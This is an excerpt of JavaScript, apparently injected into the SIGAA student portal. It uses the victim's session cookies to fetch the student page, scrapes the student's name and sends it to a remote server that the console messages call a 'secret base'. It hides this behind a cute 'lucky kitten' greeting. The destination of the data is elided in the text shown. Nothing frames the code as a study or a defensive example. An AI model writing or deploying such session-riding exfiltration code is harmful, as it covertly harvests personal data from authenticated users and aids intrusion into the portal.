      ...
      // --- 7. BUSCAR NOME ---
fetch("/sigaa/portais/discente/discente.jsf", {
    method: "GET",
    credentials: "include"
})
...
.then(buffer => {
    ...
    if (spans.length >= 7) {
        const nomeBruto = spans[6].textContent.trim();

        enviarNomeParaServidor(nomeBruto); 

        textContainer.innerHTML = `
            \u2728 Ol\u00E1, ${nomeBruto}! \u2728<br>
            <span style="font-size: 1.2rem; display:block; margin-top:15px;">
            Voc\u00EA encontrou o gatinho da sorte<br>
            Agrade\u00E7a com: <span class="phrase-highlight">"valeu gatinho"</span>
            </span>
        `;
    } else {
        textContainer.innerHTML = "O Gato n\u00E3o achou seu nome, mas quer que voc\u00EA digite <span class='phrase-highlight'>valeu gatinho</span>!";
    }
})
.catch(err => {
    console.error(err);
    textContainer.textContent = "Erro na conex\u00E3o felina.";
});
...
function enviarNomeParaServidor(nome) {
    ...
    .then(res => {
        if (res.ok) console.log("Gatinho enviou o nome para a base secreta com sucesso!");
        else console.log("Gatinho tentou enviar, mas o servidor rejeitou.");
    })
    .catch(error => {
        console.error("Erro ao contatar o servidor do Gatinho:", error);
